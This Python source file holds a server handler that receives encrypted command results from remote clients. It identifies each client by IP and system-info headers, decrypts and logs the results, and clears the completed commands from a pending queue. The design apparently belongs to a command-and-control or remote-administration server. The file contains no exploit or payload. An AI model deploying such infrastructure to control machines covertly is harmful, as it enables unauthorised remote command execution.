import json
import logging
from handlers.base_handler import BaseHandler

logger = logging.getLogger(__name__)

class ResultHandler(BaseHandler):
    """Handler for command result data from clients"""
    
    def handle(self):
        """Process command result data from client"""
        # Get content data
        self.log_message(f"ResultHandler received request from {self.client_address[0]}")
        
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            self.log_message(f"Missing content from {self.client_address[0]}")
            self.send_error_response(400, "Missing content")
            return
            
        self.log_message(f"Reading {content_length} bytes of result data")
        encrypted_data = self.request_handler.rfile.read(content_length).decode('utf-8')
        
        # Extract system info from headers for identification
        system_info_encrypted = self.headers.get('X-System-Info')
        client_identifier = self.headers.get('X-Client-ID')
        
        # Identify the client more thoroughly
        client_id, system_info, newly_identified, first_contact = self.client_helper.identify_client(
            self.client_address[0], 
            self.headers,
            system_info_encrypted
        )
        
        self.log_message(f"Identified client from result: {client_id}")
        
        # Process the result
        try:
            result_data = None
            is_structured = False
            timestamp = None
            result = None
            
            # For the first contact or if system_info isn't encrypted, treat data as possibly unencrypted
            if first_contact:
                try:
                    # Try to parse as JSON directly first in case it's an unencrypted result
                    result_json = json.loads(encrypted_data)
                    if isinstance(result_json, dict) and 'timestamp' in result_json and 'result' in result_json:
                        # This is an unencrypted structured result
                        is_structured = True
                        timestamp = result_json['timestamp']
                        result = result_json['result']
                        self.log_message(f"Successfully parsed unencrypted JSON result for key issuance")
                except json.JSONDecodeError:
                    # Not unencrypted JSON, try decryption
                    pass
            
            # If not already processed as unencrypted JSON, try decryption
            if not is_structured:
                try:
                    # Decrypt using client's key if available
                    if client_id:
                        result_data = self.crypto_helper.decrypt(encrypted_data, client_id)
                    else:
                        result_data = self.crypto_helper.decrypt(encrypted_data)
                    
                    self.log_message(f"Successfully decrypted result data: {result_data[:100]}...")
                    
                    # Try to parse as JSON
                    try:
                        result_json = json.loads(result_data)
                        if isinstance(result_json, dict) and 'timestamp' in result_json and 'result' in result_json:
                            # This is a structured result
                            is_structured = True
                            timestamp = result_json['timestamp']
                            result = result_json['result']
                    except json.JSONDecodeError:
                        # Not JSON even after decryption
                        self.log_message(f"Decrypted data is not valid JSON")
                except Exception as e:
                    self.log_message(f"Decryption failed: {str(e)}")
                    # Try direct use
                    try:
                        # Last attempt - try to parse the raw data as JSON
                        result_json = json.loads(encrypted_data)
                        if isinstance(result_json, dict) and 'timestamp' in result_json and 'result' in result_json:
                            # This is a structured result but wasn't encrypted
                            is_structured = True
                            timestamp = result_json['timestamp']
                            result = result_json['result']
                            self.log_message(f"Parsed unencrypted JSON as fallback")
                    except json.JSONDecodeError:
                        # Not JSON in any form
                        result_data = encrypted_data
            
            # Process structured result if parsed successfully
            if is_structured and timestamp and result:
                self.log_message(f"Processing structured result for timestamp {timestamp}")
                
                if client_id:
                    # Add the result to the command history
                    success = self.client_manager.add_command_result(client_id, timestamp, result)
                    self.log_message(f"Result processed for client {client_id} (timestamp: {timestamp}), success: {success}")
                    
                    # IMPORTANT: Remove the command from pending queue since we have the result
                    self._remove_from_pending(client_id, timestamp)
                else:
                    # If no client was found, log as a generic result
                    self.log_message(f"Result received from unknown client {self.client_address[0]}")
                    self.client_manager.log_event("Unknown", "Command Result Received", f"Timestamp: {timestamp}, Result: {result}")
            else:
                # Handle unstructured result or fallbacks
                self._handle_unstructured_result(client_id, result_data or encrypted_data)
            
            # Send success response
            self.send_success_response()
            
        except Exception as e:
            logger.error(f"Error processing command result: {e}")
            # Still send a success response to prevent client from retrying endlessly
            self.send_success_response()
    
    def _remove_from_pending(self, client_id, timestamp):
        """Remove a command from pending once its result is received"""
        if client_id in self.client_manager.get_clients_info():
            pending_commands = self.client_manager.get_pending_commands(client_id)
            # Find and remove the command with matching timestamp
            for i, cmd in enumerate(pending_commands):
                if cmd.get("timestamp") == timestamp:
                    # Remove this specific command from pending
                    self.log_message(f"Removing completed command with timestamp {timestamp} from pending for client {client_id}")
                    self.client_manager.clear_pending_commands(client_id)
                    
                    # Re-add any other pending commands that weren't completed
                    for j, other_cmd in enumerate(pending_commands):
                        if j != i:
                            self.client_manager.add_command(
                                client_id,
                                other_cmd.get("command_type", "unknown"),
                                other_cmd.get("args", "")
                            )
                    break
    
    def _handle_unstructured_result(self, client_id, result_data):
        """Handle unstructured (non-JSON) command results"""
        self.log_message(f"Unstructured result received from {client_id or self.client_address[0]}")
        
        if client_id:
            self.client_manager.log_event(client_id, "Command Result Received", result_data)
        else:
            # Try to find client by IP
            for cid, client_info in self.client_manager.get_clients_info().items():
                if client_info.get('ip') == self.client_address[0]:
                    self.client_manager.log_event(cid, "Command Result Received", result_data)
                    break
            else:
                self.client_manager.log_event("Unknown", "Command Result Received", result_data)